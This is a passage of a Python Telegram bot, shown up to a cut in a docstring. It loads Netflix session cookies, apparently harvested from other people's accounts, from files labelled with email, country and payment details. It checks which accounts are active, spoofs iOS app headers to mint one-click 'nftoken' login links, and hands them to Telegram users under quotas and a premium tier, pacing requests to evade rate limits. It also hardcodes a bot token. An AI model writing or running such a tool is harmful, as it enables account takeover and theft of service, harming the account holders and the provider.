import asyncio
import html
import json
import os
import random
import re
import shutil
import tempfile
import time
import urllib.parse
import zipfile
from datetime import datetime, timezone, timedelta

import requests
from urllib3.exceptions import InsecureRequestWarning

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    ContextTypes,
    filters,
)

# ==================== CONFIG ====================
BOT_TOKEN = "8419778721:AAHhCD8qDIaP0u54tFN2qowMTR-s8Chu4mY"

OWNER_IDS = {
    5954938418,
}

DAILY_LIMIT = 3
OWNER_USERNAME = "@username_"
TIMEZONE = timezone(timedelta(hours=8))

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
COOKIE_FOLDER = os.path.join(SCRIPT_DIR, "NetCookie")
VALID_FOLDER = os.path.join(COOKIE_FOLDER, "valid")
USAGE_FILE = os.path.join(SCRIPT_DIR, "usage.json")
PREMIUM_FILE = os.path.join(SCRIPT_DIR, "premium.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "bot.log")

API_URL = "https://ios.prod.ftl.netflix.com/iosui/user/15.48"

QUERY_PARAMS = {
    "appVersion": "15.48.1",
    "config": '{"gamesInTrailersEnabled":"false","isTrailersEvidenceEnabled":"false","cdsMyListSortEnabled":"true","kidsBillboardEnabled":"true","addHorizontalBoxArtToVideoSummariesEnabled":"false","skOverlayTestEnabled":"false","homeFeedTestTVMovieListsEnabled":"false","baselineOnIpadEnabled":"true","trailersVideoIdLoggingFixEnabled":"true","postPlayPreviewsEnabled":"false","bypassContextualAssetsEnabled":"false","roarEnabled":"false","useSeason1AltLabelEnabled":"false","disableCDSSearchPaginationSectionKinds":["searchVideoCarousel"],"cdsSearchHorizontalPaginationEnabled":"true","searchPreQueryGamesEnabled":"true","kidsMyListEnabled":"true","billboardEnabled":"true","useCDSGalleryEnabled":"true","contentWarningEnabled":"true","videosInPopularGamesEnabled":"true","avifFormatEnabled":"false","sharksEnabled":"true"}',
    "device_type": "NFAPPL-02-",
    "esn": "NFAPPL-02-IPHONE8%3D1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "idiom": "phone",
    "iosVersion": "15.8.5",
    "isTablet": "false",
    "languages": "en-US",
    "locale": "en-US",
    "maxDeviceWidth": "375",
    "model": "saget",
    "modelType": "IPHONE8-1",
    "odpAware": "true",
    "path": '["account","token","default"]',
    "pathFormat": "graph",
    "pixelDensity": "2.0",
    "progressive": "false",
    "responseFormat": "json",
}

BASE_HEADERS = {
    "User-Agent": "Argo/15.48.1 (iPhone; iOS 15.8.5; Scale/2.00)",
    "x-netflix.request.attempt": "1",
    "x-netflix.request.client.user.guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.context.profile-guid": "A4CS633D7VCBPE2GPK2HL4EKOE",
    "x-netflix.request.routing": '{"path":"/nq/mobile/nqios/~15.48.0/user","control_tag":"iosui_argo"}',
    "x-netflix.context.app-version": "15.48.1",
    "x-netflix.argo.translated": "true",
    "x-netflix.context.form-factor": "phone",
    "x-netflix.context.sdk-version": "2012.4",
    "x-netflix.client.appversion": "15.48.1",
    "x-netflix.context.max-device-width": "375",
    "x-netflix.context.ab-tests": "",
    "x-netflix.tracing.cl.useractionid": "4DC655F2-9C3C-4343-8229-CA1B003C3053",
    "x-netflix.client.type": "argo",
    "x-netflix.client.ftl.esn": "NFAPPL-02-IPHONE8=1-PXA-02026U9VV5O8AUKEAEO8PUJETCGDD4PQRI9DEB3MDLEMD0EACM4CS78LMD334MN3MQ3NMJ8SU9O9MVGS6BJCURM1PH1MUTGDPF4S4200",
    "x-netflix.context.locales": "en-US",
    "x-netflix.context.top-level-uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.client.iosversion": "15.8.5",
    "accept-language": "en-US;q=1",
    "x-netflix.argo.abtests": "",
    "x-netflix.context.os-version": "15.8.5",
    "x-netflix.request.client.context": '{"appState":"foreground"}',
    "x-netflix.context.ui-flavor": "argo",
    "x-netflix.argo.nfnsm": "9",
    "x-netflix.context.pixel-density": "2.0",
    "x-netflix.request.toplevel.uuid": "90AFE39F-ADF1-4D8A-B33E-528730990FE3",
    "x-netflix.request.client.timezoneid": "Asia/Dhaka",
}

COOKIE_KEYS = ("NetflixId", "SecureNetflixId", "nfvdid", "OptanonConsent")
REQUIRED_COOKIE = "NetflixId"

# Auto-remove cookie yang account-nya tak boleh guna
# (on hold / restart membership / continue payment to watch / playback error)
# Set False kalau tak nak auto-remove (skip & simpan file sahaja).
AUTO_REMOVE_BAD_ACCOUNT = True

# Pengesahan tambahan terus di www.netflix.com (sumber web) — tangkap on hold,
# restart membership, payment issue & cookie mati yang respons FTL tak cerita
# (endpoint FTL diminta dengan path=["account","token","default"] jadi respons
# nya token sahaja, tiada status account — sebab tu on hold tak terdetect dulu).
WEB_VERIFY_ENABLED = True
WEB_ACCOUNT_URL = "https://www.netflix.com/account"
WEB_UA = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
)

# Playback check — buka page /watch/<video_id> macam user tekan play.
# Netflix gate server-side: account on hold / payment issue / cancel akan
# di-redirect ke page billing SEBELUM player load — itu signal "tak boleh main".
PLAYBACK_CHECK_ENABLED = True
WATCH_URL = "https://www.netflix.com/watch/{video_id}"
# Video ID test (kalau pertama 404 kat region tu, cuba seterusnya).
# Tukar kepada ID yang wujud kat region awak kalau nak.
PLAYBACK_TEST_VIDEO_IDS = [81280792, 70143836]

# Anti rate-limit: kalau Netflix block semakan berturut-turut (403/429),
# BERHENTI selepas had ni — jangan bagi cookie yang TAK disemak kepada user.
MAX_CONSECUTIVE_BLOCKED = 3
CHECK_DELAY_RANGE = (0.2, 0.6)  # saat — delay rawak antara semakan
BLOCKED_MSG = "Netflix is blocking our checks right now (rate limit). Try again in a few minutes."

# Sumber web tambahan — page /account/membership ialah sumber utama checker
# rujukan untuk extract holdStatus / isUserOnHold / pastDue.
WEB_MEMBERSHIP_URL = "https://www.netflix.com/account/membership"

# ==================== VALID CACHE (PRE-CHECK BELAKANG) ====================
# Background checker: setiap CHECKER_INTERVAL saat, semak sehingga
# CHECKER_BATCH account raw dari NetCookie/. Yang lulus dipindah ke
# NetCookie/valid/. Bila user /get:
#   1. Ambil terus dari valid/ — cuma fetch token FTL (pantas, tiada semakan web)
#   2. Valid habis / bermasalah → semak raw macam biasa (semakan penuh)
# Stock raw tinggal <= RAW_STOCK_ALERT_THRESHOLD → notif Telegram ke owner
# (sekali sehari sahaja).
CHECKER_ENABLED = True
CHECKER_BATCH = 10            # semak 10 account setiap kitaran
CHECKER_INTERVAL = 120        # saat (2 minit)
CHECKER_BACKOFF_SECONDS = 600  # rehat checker selepas Netflix block
RAW_STOCK_ALERT_THRESHOLD = 10
RAW_STOCK_ALERT_FILE = os.path.join(SCRIPT_DIR, "stock_alert.json")
BAD_CHECKED_FILE = os.path.join(SCRIPT_DIR, "bad_checked.json")

# Jangan bagi duplicate URL — satu account sekali sehari.
# Rekod dalam served.json; owner boleh reset dengan /reset_pool.
ONE_URL_PER_ACCOUNT_PER_DAY = True
SERVED_FILE = os.path.join(SCRIPT_DIR, "served.json")

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)


# ==================== LOGGER ====================
def log(msg):
    ts = datetime.now(TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line)
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            fh.write(line + "\n")
    except Exception:
        pass


# ==================== USAGE TRACKING ====================
def _today_str():
    return datetime.now(TIMEZONE).strftime("%Y-%m-%d")


def load_usage():
    if not os.path.exists(USAGE_FILE):
        return {}
    try:
        with open(USAGE_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return {}


def save_usage(data):
    try:
        tmp = USAGE_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        os.replace(tmp, USAGE_FILE)
    except Exception as exc:
        log(f"Failed to save usage: {exc}")


# ==================== PREMIUM ====================
def load_premium():
    if not os.path.exists(PREMIUM_FILE):
        return set()
    try:
        with open(PREMIUM_FILE, "r", encoding="utf-8") as fh:
            return set(str(k) for k in json.load(fh).keys())
    except Exception:
        return set()


def save_premium(data):
    try:
        tmp = PREMIUM_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump({k: True for k in data}, fh, indent=2)
        os.replace(tmp, PREMIUM_FILE)
    except Exception as exc:
        log(f"Failed to save premium: {exc}")


def is_premium(user_id):
    return str(user_id) in load_premium()


def add_premium(user_id):
    data = load_premium()
    data.add(str(user_id))
    save_premium(data)


def remove_premium(user_id):
    data = load_premium()
    data.discard(str(user_id))
    save_premium(data)


def has_unlimited(user_id):
    return is_owner(user_id) or is_premium(user_id)


# ==================== QUOTA ====================
def get_remaining(user_id):
    if has_unlimited(user_id):
        return 999999
    data = load_usage()
    today = _today_str()
    entry = data.get(str(user_id), {})
    if entry.get("date") != today:
        return DAILY_LIMIT
    used = entry.get("count", 0)
    return max(0, DAILY_LIMIT - used)


def consume_quota(user_id):
    if has_unlimited(user_id):
        return 999999
    data = load_usage()
    today = _today_str()
    key = str(user_id)
    entry = data.get(key, {})
    if entry.get("date") != today:
        entry = {"date": today, "count": 0}
    entry["count"] = entry.get("count", 0) + 1
    data[key] = entry
    save_usage(data)
    return max(0, DAILY_LIMIT - entry["count"])


def get_global_stats():
    data = load_usage()
    today = _today_str()
    total_users = len(data)
    today_users = sum(1 for v in data.values() if v.get("date") == today)
    today_requests = sum(v.get("count", 0) for v in data.values() if v.get("date") == today)
    return {
        "total_users": total_users,
        "today_users": today_users,
        "today_requests": today_requests,
    }


def reset_user_quota(user_id):
    data = load_usage()
    data.pop(str(user_id), None)
    save_usage(data)


def reset_all_quota():
    save_usage({})


# ==================== SERVED URLS (DEDUPE) ====================
def load_served():
    if not os.path.exists(SERVED_FILE):
        return {}
    try:
        with open(SERVED_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return {}


def save_served(data):
    try:
        tmp = SERVED_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        os.replace(tmp, SERVED_FILE)
    except Exception as exc:
        log(f"Failed to save served: {exc}")


def is_served_today(fname):
    entry = load_served().get(fname)
    return bool(entry and entry.get("date") == _today_str())


def mark_served(fname, user_id, url):
    today = _today_str()
    data = load_served()
    # Buang rekod hari lain supaya fail tak membazir
    data = {k: v for k, v in data.items() if v.get("date") == today}
    data[fname] = {"user_id": str(user_id), "url": url, "date": today}
    save_served(data)


def reset_served():
    save_served({})


# ==================== VALID CACHE STORAGE ====================
def get_valid_files():
    """Senarai fail cookie yang DAH disemak penuh (folder valid/)."""
    if not os.path.isdir(VALID_FOLDER):
        return []
    return [
        f for f in os.listdir(VALID_FOLDER)
        if f.lower().endswith(".txt")
        and os.path.isfile(os.path.join(VALID_FOLDER, f))
    ]


def move_to_valid(path):
    """Pindah fail cookie yang lulus semakan ke folder valid/."""
    try:
        os.makedirs(VALID_FOLDER, exist_ok=True)
        dest = os.path.join(VALID_FOLDER, os.path.basename(path))
        os.replace(path, dest)
        log(f"[VALID] {os.path.basename(path)} dipindah ke valid/")
        return dest
    except Exception as exc:
        log(f"[VALID] Gagal pindah {path}: {exc}")
        return None


def remove_from_valid(fname, reason):
    try:
        path = os.path.join(VALID_FOLDER, fname)
        if os.path.exists(path):
            os.remove(path)
            log(f"[VALID-REMOVE] {fname}  ({reason})")
            return True
    except Exception as exc:
        log(f"[VALID-REMOVE] Failed {fname}: {exc}")
    return False


def load_bad_checked():
    if not os.path.exists(BAD_CHECKED_FILE):
        return {}
    try:
        with open(BAD_CHECKED_FILE, "r", encoding="utf-8") as fh:
            return json.load(fh)
    except Exception:
        return {}


def is_bad_checked_today(fname):
    """Fail yang dah disemak dan gagal hari ni — skip dulu, elak check berulang."""
    entry = load_bad_checked().get(fname)
    return bool(entry and entry.get("date") == _today_str())


def mark_bad_checked(fname):
    data = load_bad_checked()
    data = {k: v for k, v in data.items() if v.get("date") == _today_str()}
    data[fname] = {"date": _today_str()}
    try:
        tmp = BAD_CHECKED_FILE + ".tmp"
        with open(tmp, "w", encoding="utf-8") as fh:
            json.dump(data, fh, indent=2)
        os.replace(tmp, BAD_CHECKED_FILE)
    except Exception as exc:
        log(f"Failed to save bad_checked: {exc}")


# ==================== COOKIE HANDLING ====================
def get_cookie_files():
    if not os.path.isdir(COOKIE_FOLDER):
        os.makedirs(COOKIE_FOLDER, exist_ok=True)
        return []
    return [
        f for f in os.listdir(COOKIE_FOLDER)
        if f.lower().endswith(".txt")
        and os.path.isfile(os.path.join(COOKIE_FOLDER, f))
    ]


def parse_netscape_cookie_line(line):
    parts = line.strip().split("\t")
    if len(parts) >= 7:
        return {parts[5]: parts[6]}
    return {}


def _decode_cookie_value(value):
    if isinstance(value, str) and "%" in value:
        try:
            return urllib.parse.unquote(value)
        except Exception:
            return value
    return value


def extract_cookie_dict(text):
    cookie_dict = {}

    for raw_line in text.splitlines():
        line = raw_line.strip()
        if not line or line.startswith("#"):
            continue
        cookie_dict.update(parse_netscape_cookie_line(line))

    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        data = None

    if isinstance(data, list):
        for cookie in data:
            name = cookie.get("name")
            value = cookie.get("value")
            if name in COOKIE_KEYS and isinstance(value, str):
                cookie_dict[name] = _decode_cookie_value(value)
    elif isinstance(data, dict):
        if any(key in data for key in COOKIE_KEYS):
            for key in COOKIE_KEYS:
                value = data.get(key)
                if isinstance(value, str):
                    cookie_dict[key] = _decode_cookie_value(value)
        elif isinstance(data.get("cookies"), list):
            for cookie in data["cookies"]:
                name = cookie.get("name")
                value = cookie.get("value")
                if name in COOKIE_KEYS and isinstance(value, str):
                    cookie_dict[name] = _decode_cookie_value(value)

    for key in COOKIE_KEYS:
        if key in cookie_dict:
            continue
        match = re.search(rf"(?<!\w){re.escape(key)}=([^;,\s]+)", text)
        if match:
            cookie_dict[key] = _decode_cookie_value(match.group(1))

    return cookie_dict


def build_nftoken_link(token):
    return "https://netflix.com/?nftoken=" + token


# ==================== BAD ACCOUNT CHECK ====================
class BadAccountError(Exception):
    """Account dalam keadaan tak boleh guna (on hold, restart membership, dll.)."""

    def __init__(self, reason):
        self.reason = reason
        super().__init__(reason)


def _normalize_text(text):
    """
    Normalkan teks HTML/JSON untuk carian marker:
    - apostrophe curly U+2019 → ASCII '  (Netflix tulis "couldn't")
    - HTML entity &#39; / &#x27; → '
    - &amp; → & ; lowercase
    """
    text = (text or "").lower()
    text = text.replace("\u2019", "'").replace("&#39;", "'").replace("&#x27;", "'")
    text = text.replace("&amp;", "&")
    return text


# Boolean hold dalam payload GraphQL page account (reactContext / GrowthAccount)
# — sumber yang sama checker rujukan extract: "isUserOnHold":true,
# "holdStatus":true, "pastDue":true, atau bentuk wrapper
# {"fieldType":"Boolean","value":true}. Account SIAP sentiasa false / tiada.
_HOLD_TRUE_RE = re.compile(
    r'"(?:isuseronhold|holdstatus|isonhold|pastdue|ispastdue)"\s*:\s*'
    r'(?:true|\{[^{}]*?"value"\s*:\s*(?:true|"yes"|"on"|1))'
)

# Status membership dalam payload page account — token yang menandakan
# hold / payment retry / paused / suspend / former member
MEMBERSHIP_BAD_STATUS_TOKENS = (
    "hold", "past_due", "pastdue", "payment_retry", "paymentretry",
    "paused", "suspend", "former",
)
_MEMBERSHIP_STATUS_RE = re.compile(
    r'"(?:membershipstatus|membershipstatuskey|accountstatus|holdstatus)"\s*:\s*"([^"]+)"'
)


def detect_hold_payload(text):
    """
    Cari boolean / status hold dalam payload page account (sumber utama
    checker rujukan: growthHoldMetadata dsb.).
    Return sebab kalau jumpa, None kalau sihat / tiada.
    """
    norm = _normalize_text(text)

    m = _HOLD_TRUE_RE.search(norm)
    if m:
        return f"hold payload ({m.group(0)[:48]})"

    for m in _MEMBERSHIP_STATUS_RE.finditer(norm):
        value = m.group(1)
        for token in MEMBERSHIP_BAD_STATUS_TOKENS:
            if token in value:
                return f"membership status ({value[:48]})"

    return None


# Marker (case-insensitive) dalam response API yang menandakan account tak boleh guna.
# Sengaja spesifik — "payment" seorang diri terlalu luas (account siap pun ada data payment).
BAD_ACCOUNT_MARKERS = [
    # acc on hold
    "on hold", "on_hold", "onhold",
    # restart membership (acc cancel / former member)
    "restartmembership", "restart membership", "restart_membership", "former_member",
    # continue payment to watch
    "continue payment", "continuepayment", "continue_payment", "payment to watch",
    # playback error
    "playbackerror", "playback error", "playback_error", "can't play", "cannot play",
    # retry your payment (banner on hold dalam app/web)
    "retry your payment", "retry payment", "retrypayment", "retryyourpayment",
    # couldn't process last payment
    "couldn't process", "problem with your last payment", "process your last payment",
    # banner: "update your payment info to keep enjoying netflix"
    "to keep enjoying netflix",
    # enum status membership
    "payment_retry", "past_due", "pastdue", "membership_paused", "suspended",
]


def detect_bad_account(data):
    """
    Check response API untuk account yang tak boleh guna:
      1. Account on hold / hold boolean payload (isUserOnHold, pastDue, dll.)
      2. Restart membership        — acc cancel / former member
      3. Continue/retry payment    — payment issue
      4. Playback error
    Return string sebab kalau jumpa, None kalau account nampak OK.
    """
    if not isinstance(data, dict):
        return None

    # 1) Status account (field struktur)
    value = data.get("value")
    account = value.get("account") if isinstance(value, dict) else None
    if isinstance(account, dict):
        status = str(account.get("status") or "").lower()
        if "hold" in status:
            return f"account on hold ({status})"
        if "former" in status:
            return f"restart membership ({status})"

    # 2) Scan seluruh response untuk payload hold + marker (banner / enum / error)
    try:
        blob = json.dumps(data, default=str, ensure_ascii=False)
    except Exception:
        return None
    norm = _normalize_text(blob)

    hold = detect_hold_payload(norm)
    if hold:
        return hold

    for marker in BAD_ACCOUNT_MARKERS:
        if marker in norm:
            return f"marker '{marker}'"

    return None


# ==================== WEB VERIFY (netflix.com) ====================
# Marker khusus laman web /account + /account/membership. PENTING: account
# SIAP ada link "Update payment info" & "Cancel membership" di /account, jadi
# frase tu TIDAK dimasukkan sebagai marker buruk (elak false positive).
WEB_BAD_MARKERS = [
    # on hold
    "on hold",
    "membership on hold",
    # restart membership
    "restart your membership",
    "restart membership",
    "restartmembership",
    # continue payment / checkout billing
    "finish checkout",
    "finish payment",
    "continue payment to watch",
    "payment to watch",
    # retry your payment / couldn't process last payment (banner on hold)
    "retry your payment",
    "retry payment",
    "retryyourpayment",
    "couldn't process",
    "problem with your last payment",
    "process your last payment",
    "to keep enjoying netflix",
    # kad ditolak
    "card was declined",
    "payment declined",
    # past due / paused / suspended
    "past due",
    "membership is paused",
    "membership paused",
    "membership suspended",
    "account suspended",
]

# Path URL yang menandakan account tak aktif bila /account redirect ke sana
WEB_BAD_URL_PATTERNS = ("payment", "getstarted", "restart")


def _web_cookie_header(cookie_dict):
    return "; ".join(
        f"{k}={v}" for k, v in cookie_dict.items() if k in COOKIE_KEYS and v
    )


def _web_headers(cookie_dict):
    return {
        "User-Agent": WEB_UA,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": _web_cookie_header(cookie_dict),
    }


def verify_web_account(cookie_dict):
    """
    Pengesahan padu terus di www.netflix.com (2 sumber, macam checker rujukan):
      1. GET /account             → banner status + payload GraphQL hold
      2. GET /account/membership  → sumber utama holdStatus/isUserOnHold/pastDue
    Return (status, reason, final_url) dengan status:
      "ok"      — kedua-dua page bersih
      "dead"    — cookie mati (redirect ke login)
      "bad"     — banner / payload hold / redirect billing
      "blocked" — Netflix sekat request (403/429 / network) → JANGAN buang,
                  caller kira streak rate-limit.
    """
    if not _web_cookie_header(cookie_dict):
        return "dead", "no cookies for web check", WEB_ACCOUNT_URL

    headers = _web_headers(cookie_dict)
    final_url = WEB_ACCOUNT_URL

    for url in (WEB_ACCOUNT_URL, WEB_MEMBERSHIP_URL):
        try:
            resp = requests.get(
                url, headers=headers, timeout=20,
                verify=False, allow_redirects=True,
            )
        except Exception as exc:
            log(f"[WEB] {url} gagal ({type(exc).__name__}) — blocked (no delete)")
            return "blocked", f"web check failed ({type(exc).__name__})", url

        if resp.status_code in (403, 429):
            log(f"[WEB] HTTP {resp.status_code} di {url} — blocked (no delete)")
            return "blocked", f"web blocked (HTTP {resp.status_code})", resp.url or url

        final_url = (resp.url or "").lower()
        lower = _normalize_text(resp.text)

        # Cookie mati → Netflix tendang ke login
        if "/login" in final_url or "signin" in final_url or 'name="loginaction"' in lower:
            return "dead", "cookie dead (redirect to login)", final_url

        # Redirect ke page billing / restart → account tak aktif
        for pattern in WEB_BAD_URL_PATTERNS:
            if pattern in final_url:
                return "bad", f"web redirect: {pattern}", final_url

        # Banner status dalam HTML
        for marker in WEB_BAD_MARKERS:
            if marker in lower:
                return "bad", f"web: {marker}", final_url

        # Payload GraphQL hold (isUserOnHold / pastDue / membershipStatus)
        hold = detect_hold_payload(lower)
        if hold:
            return "bad", f"web: {hold}", final_url

    return "ok", None, final_url


# ==================== PLAYBACK VERIFY (netflix.com/watch) ====================
# Marker buruk khas page /watch — account SIAP yang boleh main TAK ada teks ni.
# Termasuk banner on hold app: "Retry your Payment? We couldn't process your
# last payment. Retry (VISA - 6512) or update your payment info to keep
# enjoying Netflix."
PLAYBACK_BAD_MARKERS = [
    # on hold
    "on hold",
    "membership on hold",
    # restart membership / cancel
    "restart your membership",
    "restart membership",
    "restartmembership",
    "membership canceled",
    "canceled membership",
    # continue payment / checkout billing
    "finish checkout",
    "finish payment",
    "continue payment to watch",
    "payment to watch",
    "update your payment",
    "to continue watching",
    # retry your payment / couldn't process last payment
    "retry your payment",
    "retry payment",
    "retryyourpayment",
    "couldn't process",
    "problem with your last payment",
    "process your last payment",
    "to keep enjoying netflix",
    # kad ditolak
    "card was declined",
    "payment declined",
    # past due / paused / suspended
    "past due",
    "membership is paused",
    "membership paused",
    "membership suspended",
    "account suspended",
]

# Bila /watch redirect keluar ke path ni — kena billing/signup wall, tak boleh main
PLAYBACK_BAD_URL_PATTERNS = (
    "payment", "getstarted", "restart", "referpayment", "billing", "signup",
)

# Signal positif — page player betul-betul load (account siap, boleh main)
PLAYBACK_POSITIVE_SIGNALS = (
    "videoplayer", "nflxplayer", "playrun", '"videoid"', "reactcontext",
)


def verify_playback(cookie_dict):
    """
    Check macam user tekan 'play' — GET page /watch/<video_id> dengan cookie.
    Netflix buat gate server-side: on hold / payment issue / cancel di-redirect
    ke page billing SEBELUM player load.
    Return (status, reason, final_url) dengan status:
      "ok"      — player load / page bersih
      "dead"    — cookie mati (redirect ke login)
      "bad"     — billing wall / banner hold → tak boleh main
      "blocked" — Netflix sekat (403/429 / network) → JANGAN buang,
                  caller kira streak rate-limit.
    """
    if not _web_cookie_header(cookie_dict):
        return "dead", "no cookies for playback check", ""

    headers = _web_headers(cookie_dict)

    for video_id in PLAYBACK_TEST_VIDEO_IDS:
        url = WATCH_URL.format(video_id=video_id)
        try:
            resp = requests.get(
                url, headers=headers, timeout=20,
                verify=False, allow_redirects=True,
            )
        except Exception as exc:
            log(f"[PLAYBACK] {url} gagal ({type(exc).__name__}) — blocked (no delete)")
            return "blocked", f"playback check failed ({type(exc).__name__})", url

        if resp.status_code in (403, 429):
            log(f"[PLAYBACK] HTTP {resp.status_code} — blocked (no delete)")
            return "blocked", f"playback blocked (HTTP {resp.status_code})", resp.url or url
        if resp.status_code in (404, 410):
            continue  # video tak wujud kat region ni — cuba ID seterusnya

        final_url = (resp.url or "").lower()
        lower = _normalize_text(resp.text)

        # Redirect keluar dari page watch → Netflix gate
        still_watch = f"/watch/{video_id}" in final_url
        if not still_watch:
            if "/login" in final_url or "signin" in final_url:
                return "dead", "cookie dead (redirect to login)", final_url
            for pattern in PLAYBACK_BAD_URL_PATTERNS:
                if pattern in final_url:
                    return "bad", f"playback blocked (redirect: {pattern})", final_url

        # Banner / teks billing dalam page watch
        for marker in PLAYBACK_BAD_MARKERS:
            if marker in lower:
                return "bad", f"playback blocked ({marker})", final_url

        # Payload GraphQL hold (kalau page watch bawa data account)
        hold = detect_hold_payload(lower)
        if hold:
            return "bad", f"playback: {hold}", final_url

        # Player betul-betul load → boleh main
        if any(sig in lower for sig in PLAYBACK_POSITIVE_SIGNALS):
            return "ok", None, final_url
        # Tak pasti — cuba video ID seterusnya

    # Semua inconclusive → biar (check web /account dah jadi lapisan utama)
    return "ok", None, ""


def fetch_nftoken(cookie_dict):
    netflix_id = cookie_dict.get(REQUIRED_COOKIE)
    if not netflix_id:
        raise ValueError("Missing NetflixId")

    headers = dict(BASE_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"

    response = requests.get(
        API_URL, params=QUERY_PARAMS, headers=headers, timeout=30, verify=False,
    )
    response.raise_for_status()

    data = response.json()

    # --- Check status account sebelum guna token ---
    bad = detect_bad_account(data)
    if bad:
        raise BadAccountError(bad)

    value = data.get("value") or {}
    if isinstance(value, dict):
        if "error" in value or "errors" in data:
            raise ValueError("API error")

    token_data = (
        ((value.get("account") or {}).get("token") or {}).get("default")
        or {}
    )
    token = token_data.get("token")
    expires = token_data.get("expires")

    if not token:
        raise ValueError("No token in response")

    if isinstance(expires, int) and len(str(expires)) == 13:
        expires //= 1000

    return token, expires


def format_expiry(expires):
    if not isinstance(expires, (int, float)):
        return "Unknown"
    try:
        return datetime.fromtimestamp(expires, tz=TIMEZONE).strftime("%Y-%m-%d %H:%M:%S")
    except Exception:
        return str(expires)


def is_expired(expires):
    if not isinstance(expires, (int, float)):
        return False
    try:
        return datetime.now(TIMEZONE).timestamp() >= expires
    except Exception:
        return False


def verify_cookie_content(content):
    """
    Semakan PENUH untuk satu kandungan cookie file — dipakai oleh raw flow
    /get DAN background checker (satu tempat, result seragam).
    Return (status, reason, cookie_dict, token, expires):
      "ok"      — lulus semua: web + playback + token FTL sihat
      "dead"    — cookie mati (redirect login / tiada cookie)
      "bad"     — on hold / restart / payment / payload hold / expired
      "blocked" — Netflix sekat (403/429 / network) → JANGAN buang fail
      "error"   — tiada NetflixId / HTTP lain / ralat tak dijangka
    """
    cookie_dict = extract_cookie_dict(content)
    if not cookie_dict or REQUIRED_COOKIE not in cookie_dict:
        return "error", "no NetflixId", {}, None, None

    if WEB_VERIFY_ENABLED:
        status, web_bad, _final = verify_web_account(cookie_dict)
        if status != "ok":
            return status, web_bad or status, cookie_dict, None, None

    if PLAYBACK_CHECK_ENABLED:
        status, play_bad, _purl = verify_playback(cookie_dict)
        if status != "ok":
            return status, play_bad or status, cookie_dict, None, None

    try:
        token, expires = fetch_nftoken(cookie_dict)
    except BadAccountError as exc:
        return "bad", exc.reason, cookie_dict, None, None
    except requests.HTTPError as exc:
        code = exc.response.status_code if exc.response is not None else 0
        if code in (403, 429):
            return "blocked", f"FTL HTTP {code}", cookie_dict, None, None
        return "error", f"HTTP {code}", cookie_dict, None, None
    except Exception as exc:
        msg = str(exc) or type(exc).__name__
        return "error", msg[:40], cookie_dict, None, None

    if not token:
        return "bad", "empty token", cookie_dict, None, None
    if is_expired(expires):
        return "bad", "expired", cookie_dict, None, None

    return "ok", None, cookie_dict, token, expires


def parse_cookie_filename_info(filename):
    info = {
        "plan": "Unknown",
        "payments": "-",
        "extra": "-",
        "country": "-",
        "email": "-",
    }
    if not filename:
        return info

    name = filename
    if name.lower().endswith(".txt"):
        name = name[:-4]

    brackets = re.findall(r"\[([^\]]*)\]", name)
    if len(brackets) >= 5:
        info["plan"] = brackets[0].strip() or "Unknown"
        info["payments"] = brackets[1].strip()
        info["extra"] = brackets[2].strip()
        info["country"] = brackets[3].strip()
        info["email"] = brackets[4].strip()
    elif len(brackets) >= 1:
        info["plan"] = brackets[0].strip() or "Unknown"

    return info


# ==================== CLEANUP ====================
def cleanup_duplicate_files():
    """
    Padam HANYA file cookie bernama duplicate (case-insensitive) — simpan satu sahaja.
    File lain SEMUA dikekalkan (termasuk yang tiada 'premium' dalam nama).
    Dipanggil automatik masa bot start.
    """
    if not os.path.isdir(COOKIE_FOLDER):
        log("[CLEANUP] NetCookie folder not found. Skipping.")
        return

    files = [
        f for f in os.listdir(COOKIE_FOLDER)
        if f.lower().endswith(".txt")
        and os.path.isfile(os.path.join(COOKIE_FOLDER, f))
    ]

    if not files:
        log("[CLEANUP] No cookie files found. Nothing to delete.")
        return

    deleted = []
    kept_names = set()

    for fname in sorted(files):
        path = os.path.join(COOKIE_FOLDER, fname)
        lower_name = fname.lower()

        if lower_name in kept_names:
            try:
                os.remove(path)
                deleted.append((fname, "duplicate name"))
            except Exception as exc:
                log(f"[CLEANUP] Failed to delete {fname}: {exc}")
            continue

        kept_names.add(lower_name)

    if deleted:
        log(f"[CLEANUP] Deleted {len(deleted)} duplicate file(s):")
        for fname, reason in deleted:
            log(f"[CLEANUP]   - {fname}  ({reason})")
    else:
        log("[CLEANUP] No duplicates found. Nothing deleted.")


# ==================== BAD-ACCOUNT REMOVER ====================
def _remove_bad_cookie(path, reason):
    """Auto-remove cookie yang account-nya tak boleh guna, dengan log."""
    try:
        if os.path.exists(path):
            os.remove(path)
            log(f"[AUTO-REMOVE] {os.path.basename(path)}  ({reason})")
            return True
    except Exception as exc:
        log(f"[AUTO-REMOVE] Failed {path}: {exc}")
    return False


# ==================== ZIP UPLOAD ====================
def process_zip_upload(zip_path):
    """
    Extract ZIP ke NetCookie/.
    - Hanya .txt files
    - Filename mesti ada 'premium'
    - Content mesti ada NetflixId
    - Overwrite kalau nama sama
